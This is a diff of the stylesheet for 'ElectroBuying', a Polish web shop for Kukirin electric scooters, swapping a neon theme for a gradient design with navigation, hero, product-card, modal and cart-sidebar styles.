@@ -3,1332 +3,2448 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link href="https://fonts.googleapis.com/css2?family=Electrolize&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
-    <title>ElectroBuying ⚡️</title>
+    <title>ElectroBuying - Hulajnogi Elektryczne Kukirin</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛴</text></svg>">
     <style>
-        :root {
-            --bg-color: #0F0E1E;
-            --primary-neon: #00FFFF;
-            --secondary-neon: #FF00FF;
-            --text-color: #E0E0E0;
-            --card-bg: #1A1A30;
-            --button-bg: linear-gradient(45deg, var(--primary-neon), var(--secondary-neon));
-            --shadow-light: rgba(0, 255, 255, 0.4);
-            --shadow-dark: rgba(255, 0, 255, 0.4);
-            --border-neon: #00FFFF80;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
         body {
-            margin: 0;
-            background: var(--bg-color);
-            color: var(--text-color);
-            font-family: 'Electrolize', sans-serif;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.6;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 25%, #16213e 50%, #0f3460 75%, #0e2954 100%);
             min-height: 100vh;
-            overflow-x: hidden;
-            position: relative;
+            scroll-behavior: smooth;
+            color: white;
         }
 
-        header {
-            padding: 50px 20px 30px;
-            text-align: center;
-            background: linear-gradient(90deg, var(--primary-neon) 0%, var(--secondary-neon) 100%);
-            color: var(--bg-color);
-            font-size: 3.5rem;
-            font-weight: 700;
-            letter-spacing: 5px;
-            border-bottom-left-radius: 60px;
-            border-bottom-right-radius: 60px;
-            box-shadow: 0 10px 40px var(--shadow-light), 0 5px 20px var(--shadow-dark);
-            margin-bottom: 40px;
-            text-shadow: 0 0 20px #fff, 0 0 10px var(--primary-neon);
-            text-transform: uppercase;
-            position: relative;
-            z-index: 2;
-            animation: fadeIn 1s ease-in-out;
-            font-family: 'Orbitron', sans-serif;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(-30px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .scooter-bg {
+        /* Navigation */
+        nav {
             position: fixed;
-            bottom: 0;
-            right: -50px;
-            width: 500px;
-            max-width: 70vw;
-            opacity: 0.1;
-            z-index: 0;
-            pointer-events: none;
-            filter: blur(2px) grayscale(0.5);
-            transform: rotate(-15deg);
+            top: 0;
+            width: 100%;
+            background: rgba(10, 10, 10, 0.9);
+            backdrop-filter: blur(30px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 1000;
+            padding: 1rem 0;
+            transition: all 0.3s ease;
         }
 
-        .scooter-bg2 {
-            position: fixed;
-            top: 80px;
-            left: -50px;
-            width: 400px;
-            max-width: 50vw;
-            opacity: 0.08;
-            z-index: 0;
-            pointer-events: none;
-            filter: blur(2.5px) grayscale(0.6);
-            transform: scaleX(-1) rotate(10deg);
-        }
-
-        .products {
-            display: flex;
-            justify-content: center;
-            gap: 40px;
-            padding: 40px 20px;
-            flex-wrap: wrap;
-            max-width: 1400px;
+        .nav-container {
+            max-width: 1200px;
             margin: 0 auto;
-            position: relative;
-            z-index: 2;
-        }
-
-        .product {
-            background: var(--card-bg);
-            padding: 30px 25px 25px;
-            border-radius: 30px;
-            width: 300px;
-            text-align: center;
-            box-shadow: 0 10px 40px var(--shadow-dark), 0 5px 20px var(--shadow-light);
-            position: relative;
-            overflow: hidden;
-            border: 2px solid var(--border-neon);
-            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
-            cursor: pointer;
-            backdrop-filter: blur(5px);
-        }
-
-        .product:hover {
-            transform: translateY(-10px) scale(1.03);
-            box-shadow: 0 15px 50px var(--shadow-light), 0 8px 30px var(--shadow-dark);
-        }
-
-        .product-img-wrap {
-            width: 100%;
-            height: 280px;
             display: flex;
+            justify-content: space-between;
             align-items: center;
-            justify-content: center;
-            background: var(--card-bg);
-            border-radius: 20px;
-            margin-bottom: 25px;
-            overflow: hidden;
-            position: relative;
-            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
+            padding: 0 2rem;
         }
 
-        .product img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            display: block;
-            background: transparent;
-            transition: transform 0.3s ease-in-out;
+        .logo {
+            font-size: 2.2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
         }
 
-        .product h3 {
-            margin: 10px 0 8px 0;
-            font-size: 1.5rem;
-            color: var(--primary-neon);
-            font-weight: 700;
-            letter-spacing: 1.5px;
-            text-shadow: 0 0 10px var(--primary-neon);
-            font-family: 'Orbitron', sans-serif;
-            transition: color 0.3s ease-in-out;
-        }
-        
-        .product:hover h3 {
-            color: var(--secondary-neon);
-            text-shadow: 0 0 10px var(--secondary-neon);
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+            align-items: center;
         }
 
-        .product p {
-            margin: 0 0 20px 0;
-            font-size: 1.2rem;
-            color: var(--text-color);
+        .nav-links a {
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
             font-weight: 500;
-            letter-spacing: 0.8px;
+            transition: all 0.3s ease;
+            padding: 0.5rem 1rem;
+            border-radius: 25px;
+            position: relative;
+            overflow: hidden;
         }
 
-        .product button {
-            background: var(--button-bg);
-            color: var(--bg-color);
-            border: none;
-            padding: 15px 30px;
-            cursor: pointer;
-            border-radius: 15px;
-            font-size: 1.2rem;
-            font-weight: 700;
-            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
-            font-family: 'Electrolize', sans-serif;
-            letter-spacing: 1.5px;
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out, background 0.2s ease-in-out;
-        }
-
-        .product button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
+        .nav-links a:hover {
+            color: #00d4ff;
+            transform: translateY(-2px);
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .cart-icon {
-            position: fixed;
-            top: 40px;
-            left: 40px;
-            z-index: 1001;
-            background: linear-gradient(135deg, var(--primary-neon), var(--secondary-neon));
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            color: white;
+            padding: 0.8rem;
             border-radius: 50%;
-            width: 70px;
-            height: 70px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: 0 0 20px var(--shadow-light), 0 0 15px var(--shadow-dark);
             cursor: pointer;
-            border: 3px solid var(--primary-neon);
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+            position: relative;
+            border: none;
         }
 
         .cart-icon:hover {
-            transform: scale(1.1) rotate(5deg);
-            box-shadow: 0 0 30px var(--shadow-light), 0 0 20px var(--shadow-dark);
+            transform: translateY(-2px) scale(1.05);
+            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.3);
+            background: linear-gradient(135deg, #7c3aed, #00d4ff); /* Glaze effect on hover */
         }
 
-        .cart-icon svg {
-            width: 40px;
-            height: 40px;
-            fill: var(--bg-color);
+        .cart-icon.animate {
+            animation: cartPop 0.3s ease-out;
+        }
+
+        @keyframes cartPop {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.7); } /* 70% enlargement */
+            100% { transform: scale(1); }
         }
 
         .cart-count {
             position: absolute;
-            top: 15px;
-            left: 50px;
-            background: var(--secondary-neon);
-            color: var(--bg-color);
+            top: -5px;
+            right: -5px;
+            background: #ec4899;
+            color: white;
             border-radius: 50%;
-            width: 25px;
-            height: 25px;
+            width: 20px;
+            height: 20px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border: 2px solid var(--primary-neon);
-            box-shadow: 0 0 10px var(--shadow-dark);
+            font-size: 0.8rem;
+            font-weight: 700;
         }
 
-        .cart-modal-bg {
-            position: fixed;
+        /* Hero Section */
+        .hero {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: white;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(124, 58, 237, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(0, 212, 255, 0.3) 0%, transparent 50%),
+                linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 25%, #16213e 50%, #0f3460 75%, #0e2954 100%);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(15, 14, 30, 0.85);
-            z-index: 1002;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 25% 25%, rgba(124, 58, 237, 0.1) 0%, transparent 40%),
+                radial-gradient(circle at 75% 75%, rgba(0, 212, 255, 0.1) 0%, transparent 40%);
+            animation: pulse 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.3; }
+            100% { opacity: 0.7; }
+        }
+
+        .hero-content {
+            z-index: 2;
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        .hero h1 {
+            font-size: 5rem;
+            font-weight: 900;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(135deg, #00d4ff 0%, #7c3aed 50%, #ec4899 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 50px rgba(0, 212, 255, 0.3);
+            animation: glow 3s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { filter: drop-shadow(0 0 20px rgba(0, 212, 255, 0.3)); }
+            to { filter: drop-shadow(0 0 40px rgba(124, 58, 237, 0.5)); }
+        }
+
+        .hero-subtitle {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            font-weight: 300;
+            opacity: 0.9;
+            letter-spacing: 0.5px;
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            margin-bottom: 3rem;
+            opacity: 0.8;
+            font-weight: 400;
+            line-height: 1.8;
+        }
+
+        .cta-button {
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            color: white;
+            padding: 1.2rem 3rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            text-decoration: none;
+            display: inline-block;
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 20px 50px rgba(124, 58, 237, 0.4);
+        }
+
+        /* Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 2rem;
+        }
+
+        /* Section Styles */
+        section {
+            padding: 5rem 0;
+            margin: 2rem 0;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 3.5rem;
+            font-weight: 900;
+            margin-bottom: 4rem;
+            color: white;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(90deg, #00d4ff, #7c3aed);
+            border-radius: 2px;
+        }
+
+        /* Products Section */
+        .products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 2.5rem;
+            margin-top: 4rem;
+        }
+
+        .product-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(30px);
+            border-radius: 25px;
+            padding: 2.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.4s ease;
+            color: white;
+            position: relative;
+            overflow: hidden;
+            cursor: pointer;
+        }
+
+        .product-card:hover {
+            transform: translateY(-15px);
+            border-color: rgba(0, 212, 255, 0.3);
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.08);
+        }
+
+        .product-image-wrapper {
+            width: 100%;
+            height: 220px;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 20px;
+            margin-bottom: 1.5rem;
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.5s ease-out;
-            backdrop-filter: blur(10px);
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .cart-modal-bg.open {
-            opacity: 1;
-            pointer-events: auto;
+        .product-image-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ensures the image covers the area, cropping if necessary */
+            transition: transform 0.3s ease;
         }
 
-        #cart-panel {
-            width: 380px;
-            background: linear-gradient(135deg, var(--card-bg) 60%, var(--primary-neon) 100%);
-            color: var(--text-color);
+        .product-card:hover .product-image-wrapper img {
+            transform: scale(1.05);
+        }
+
+        /* New styles for product icons in main grid and modal */
+        .product-icon-display {
+            font-size: 4rem; /* Large emoji size */
+            color: #00d4ff; /* Icon color */
+            text-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+        }
+        .product-icon-display .product-icon {
+            display: block; /* Ensure emoji is centered */
+        }
+
+
+        .product-name {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 0.8rem;
+            color: white;
+        }
+
+        .product-price {
+            font-size: 2.2rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+        }
+
+        .product-price.discounted {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .old-price {
+            font-size: 1.2rem;
+            color: rgba(255, 255, 255, 0.5);
+            text-decoration: line-through;
+            font-weight: 500;
+        }
+
+        .discount-badge {
+            background: linear-gradient(135deg, #ec4899, #f59e0b);
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+
+        .product-description {
+            opacity: 0.8;
+            margin-bottom: 2rem;
+            line-height: 1.7;
+            font-weight: 400;
+        }
+
+        .buy-button {
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            color: white;
+            padding: 1rem 2rem;
+            border: none;
             border-radius: 25px;
-            box-shadow: 0 0 40px var(--shadow-light), 0 10px 40px var(--shadow-dark);
-            border: 2px solid var(--primary-neon);
-            padding: 30px;
-            transform: scale(0.9);
-            transition: transform 0.5s ease-out;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            font-size: 1.1rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .buy-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
+        }
+
+        /* Modal Styles (Product Details) */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 2000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(10px); /* Blur effect for background */
+            overflow: auto; /* Allow modal itself to scroll if content is too large for viewport */
+        }
+
+        .modal-content {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            margin: 2.5% auto; /* Centered, almost full screen */
+            padding: 3rem;
+            border-radius: 25px;
+            width: 95%;
+            max-width: 1000px; /* Larger max-width */
+            min-height: 80vh; /* Minimum height */
+            max-height: 95vh; /* Max height to prevent overflow */
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto; /* Content inside modal scrolls */
+            -ms-overflow-style: none;  /* IE and Edge */
+            scrollbar-width: none;  /* Firefox */
+        }
+        .modal-content::-webkit-scrollbar {
+            display: none; /* Chrome, Safari, Opera */
+        }
+
+        .close {
+            color: rgba(255, 255, 255, 0.7);
+            float: right;
+            font-size: 2.5rem; /* Larger close button */
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: absolute;
+            top: 1.5rem;
+            right: 2rem;
+        }
+
+        .close:hover {
+            color: #00d4ff;
+            transform: scale(1.2);
+        }
+
+        .modal h2 {
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            font-size: 3rem; /* Larger title */
+            margin-bottom: 2rem;
+            font-weight: 800;
+            text-align: center;
+        }
+
+        .modal-product-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+            margin-bottom: 3rem;
+        }
+
+        .modal-product-image-wrapper {
+            flex: 1;
+            min-width: 300px;
+            height: 300px;
+            background: linear-gradient(135deg, #0f3460, #1a1a2e);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        /* Removed img specific styles from modal-product-image-wrapper to allow icon display */
+        /* .modal-product-image-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background-color: #1a1a2e;
+        } */
+
+        .modal-product-details {
+            flex: 2;
+            min-width: 300px;
+        }
+
+        .modal-product-details h3 {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            color: white;
+        }
+
+        .modal-product-details .product-price {
+            font-size: 2.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-product-details p {
+            opacity: 0.9;
+            line-height: 1.7;
+            margin-bottom: 2rem;
+        }
+
+        .specs-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .spec-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            border-radius: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .spec-item strong {
+            display: block;
+            font-size: 0.9rem;
+            color: #00d4ff;
+            margin-bottom: 0.3rem;
+        }
+
+        .spec-item span {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: white;
+        }
+
+        .product-reviews-modal {
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .product-reviews-modal h3 {
+            color: #00d4ff;
+            margin-bottom: 1.5rem;
+            font-size: 2rem;
+            text-align: center;
+        }
+
+        /* Cart Sidebar */
+        .cart-sidebar {
+            position: fixed;
+            top: 0;
+            right: -400px;
+            width: 400px;
+            height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            backdrop-filter: blur(30px);
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            z-index: 2000;
+            transition: right 0.3s ease;
+            padding: 2rem;
+            overflow-y: auto;
             display: flex;
             flex-direction: column;
         }
 
-        .cart-modal-bg.open #cart-panel {
-            transform: scale(1);
+        .cart-sidebar.open {
+            right: 0;
         }
 
-        #cart-panel h2 {
-            margin-top: 0;
-            font-size: 1.8rem;
-            text-align: center;
-            color: var(--primary-neon);
-            letter-spacing: 1.5px;
+        .cart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .cart-title {
+            font-size: 1.8rem; /* Larger cart title */
             font-weight: 700;
-            margin-bottom: 20px;
-            text-shadow: 0 0 10px var(--primary-neon);
-            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .cart-close {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 2rem; /* Larger close button */
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .cart-close:hover {
+            color: #ec4899;
+            transform: scale(1.1);
+        }
+
+        .cart-items {
+            flex-grow: 1; /* Allow cart items to take available space */
+            margin-bottom: 2rem;
         }
 
         .cart-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin: 12px 0;
-            background: #23234Bcc;
-            border-radius: 12px;
-            padding: 10px 15px;
-            box-shadow: 0 2px 10px var(--shadow-light);
+            padding: 1rem 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.5s ease-out; /* For evaporation animation */
+        }
+
+        .cart-item.removing {
+            opacity: 0;
+            transform: translateY(-20px) scale(0.8);
+            filter: blur(5px);
+        }
+
+        .cart-item-name {
+            font-weight: 600;
+            color: white;
             font-size: 1.1rem;
-            font-weight: 500;
-            letter-spacing: 0.5px;
         }
 
-        .cart-item button {
-            background: #333;
-            border: none;
-            color: var(--text-color);
-            font-size: 1.3rem;
-            width: 35px;
-            height: 35px;
-            cursor: pointer;
-            border-radius: 50%;
-            margin: 0 3px;
-            font-family: 'Electrolize', sans-serif;
-            transition: background 0.2s ease-in-out;
-        }
-
-        .cart-item button:hover {
-            background: var(--primary-neon);
-            color: var(--bg-color);
-        }
-
-        .checkout {
-            background: var(--button-bg);
-            border: 2px solid var(--primary-neon);
-            color: var(--bg-color);
-            padding: 18px;
-            width: 100%;
-            cursor: pointer;
-            font-size: 1.3rem;
-            border-radius: 15px;
-            margin-top: 20px;
+        .cart-item-price {
+            color: #00d4ff;
             font-weight: 700;
-            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
-            font-family: 'Electrolize', sans-serif;
-            letter-spacing: 1.5px;
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-        }
-        
-        .checkout:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
-        }
-
-        .close-cart {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: none;
-            border: none;
-            color: var(--text-color);
-            font-size: 2rem;
-            cursor: pointer;
-            z-index: 10;
-            transition: color 0.2s ease-in-out;
-        }
-        
-        .close-cart:hover {
-            color: var(--secondary-neon);
+            font-size: 1.1rem;
         }
 
         .cart-total {
-            text-align: right;
-            font-size: 1.4rem;
-            margin-top: 15px;
-            font-weight: bold;
-            color: var(--primary-neon);
-            letter-spacing: 1.5px;
-            text-shadow: 0 0 8px var(--primary-neon);
-        }
-
-        .cart-error {
-            color: #fff;
-            background: #e53935;
-            border-radius: 10px;
-            padding: 12px 0;
+            font-size: 1.5rem; /* Larger total */
+            font-weight: 800;
             text-align: center;
-            font-weight: bold;
-            margin-bottom: 12px;
-            font-size: 1.2rem;
-            box-shadow: 0 2px 10px #e5393555;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
         }
 
-        .modal-bg {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(15, 14, 30, 0.85);
+        .checkout-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #00d4ff, #7c3aed);
+            color: white;
+            padding: 1rem;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+        }
+
+        .checkout-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(0, 212, 255, 0.4);
+        }
+
+        /* Checkout Modal (New) */
+        .checkout-modal {
+            display: none;
+            position: fixed;
             z-index: 2000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            opacity: 0;
-            pointer-events: none;
-            transition: opacity 0.4s ease-out;
-            backdrop-filter: blur(5px);
-        }
-
-        .modal-bg.open {
-            opacity: 1;
-            pointer-events: auto;
-        }
-
-        .modal {
-            background: linear-gradient(135deg, var(--card-bg) 60%, var(--primary-neon) 100%);
-            border-radius: 25px;
-            padding: 35px 30px;
-            min-width: 350px;
-            max-width: 95vw;
-            box-shadow: 0 0 40px var(--shadow-light), 0 10px 40px var(--shadow-dark);
-            color: var(--text-color);
-            position: relative;
-            border: 2px solid var(--primary-neon);
-            transform: translateY(-30px);
-            opacity: 0;
-            transition: transform 0.5s ease-out, opacity 0.5s ease-out;
-        }
-        
-        .modal-bg.open .modal {
-            transform: translateY(0);
-            opacity: 1;
-        }
-
-        .modal h2 {
-            margin-top: 0;
-            color: var(--primary-neon);
-            text-align: center;
-            font-size: 1.8rem;
-            margin-bottom: 20px;
-            letter-spacing: 1.5px;
-            font-weight: 700;
-            text-shadow: 0 0 10px var(--primary-neon);
-        }
-
-        .modal .pay-options, .modal .crypto-options, .modal .dane-form, .modal .blik-form, .modal .psc-form {
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            margin-bottom: 20px;
-            align-items: center; 
-        }
-
-        .modal .pay-btn, .modal .crypto-btn {
-            background: var(--button-bg);
-            color: var(--bg-color);
-            border: none;
-            border-radius: 15px;
-            padding: 15px 0;
-            font-size: 1.2rem;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
-            font-family: 'Electrolize', sans-serif;
-            letter-spacing: 1.5px;
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-            width: 100%;
-        }
-        
-        .modal .pay-btn:hover, .modal .crypto-btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
-        }
-
-        .modal .pay-info {
-            margin-top: 15px;
-            background: #23234Bcc;
-            border-radius: 12px;
-            padding: 15px;
-            color: var(--primary-neon);
-            font-size: 1.1rem;
-            text-align: center;
-            font-weight: 500;
-            word-break: break-all;
-            box-shadow: 0 2px 10px var(--shadow-light);
-        }
-
-        .modal input {
-            padding: 12px;
-            border-radius: 10px;
-            border: 2px solid var(--primary-neon);
-            font-size: 1.2rem;
-            width: 250px;
-            text-align: center;
-            background: var(--bg-color);
-            color: var(--primary-neon);
-            outline: none;
-            margin-bottom: 8px;
-            transition: border-color 0.2s ease-in-out;
-        }
-        
-        .modal input:focus {
-            border-color: var(--secondary-neon);
-        }
-
-        .modal button[type="submit"] {
-            background: var(--button-bg);
-            color: var(--bg-color);
-            border: none;
-            border-radius: 10px;
-            padding: 12px 24px;
-            font-size: 1.1rem;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 0 2px 10px var(--shadow-light);
-            font-family: 'Electrolize', sans-serif;
-            letter-spacing: 1px;
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-            width: 250px;
-        }
-        
-        .modal button[type="submit"]:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 20px var(--shadow-dark);
-        }
-
-        .modal .blik-success, .modal .psc-success, .modal .dane-success, .modal .pay-final-msg {
-            font-weight: 700;
-            margin-top: 15px;
-            font-size: 1.2rem;
-            text-align: center;
-        }
-        
-        .dane-success { color: #0f0; }
-        .blik-success { color: var(--primary-neon); }
-        .psc-success { color: #0f0; }
-        .pay-final-msg { color: var(--primary-neon); }
-
-        .modal .close-modal {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            background: none;
-            border: none;
-            color: var(--text-color);
-            font-size: 2rem;
-            cursor: pointer;
-            z-index: 10;
-            transition: color 0.2s ease-in-out;
-        }
-        
-        .modal .close-modal:hover {
-            color: var(--secondary-neon);
-        }
-
-        /* Zmiany dla modalu produktu */
-        #productModal {
-            max-width: 900px;
-            display: flex;
-            flex-direction: row;
-            gap: 40px;
-            align-items: center;
-            transition: all 0.5s ease-out;
-            transform: translateY(-50px) scale(0.9);
-            opacity: 0;
-            background: linear-gradient(135deg, var(--card-bg) 60%, var(--primary-neon) 100%);
-            border-radius: 30px;
-            padding: 40px;
-            border: 2px solid var(--primary-neon);
-            box-shadow: 0 0 50px var(--shadow-light), 0 15px 60px var(--shadow-dark);
-        }
-        
-        #productModalBg.open #productModal {
-            transform: translateY(0) scale(1);
-            opacity: 1;
-        }
-
-        #productModal h2 {
-            font-size: 2.5rem;
-            margin-bottom: 10px;
-            text-align: left;
-            text-shadow: 0 0 15px var(--primary-neon);
-            font-family: 'Orbitron', sans-serif;
-            color: var(--primary-neon);
-        }
-
-        #productModal .product-modal-img-container {
-            flex: 1;
-            min-width: 350px;
-            max-width: 450px;
-            height: 350px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: var(--card-bg);
-            border-radius: 20px;
-            padding: 15px;
-            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
-            border: 2px solid var(--border-neon);
-        }
-
-        #productModal .product-modal-img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            border-radius: 15px;
-            transition: transform 0.3s ease-in-out;
-        }
-
-        #productModal .product-modal-details {
-            flex: 1;
-            text-align: left;
-        }
-
-        #productModal .product-modal-price {
-            font-size: 2.2rem;
-            font-weight: bold;
-            color: var(--secondary-neon);
-            margin: 15px 0 25px 0;
-            text-shadow: 0 0 10px var(--secondary-neon);
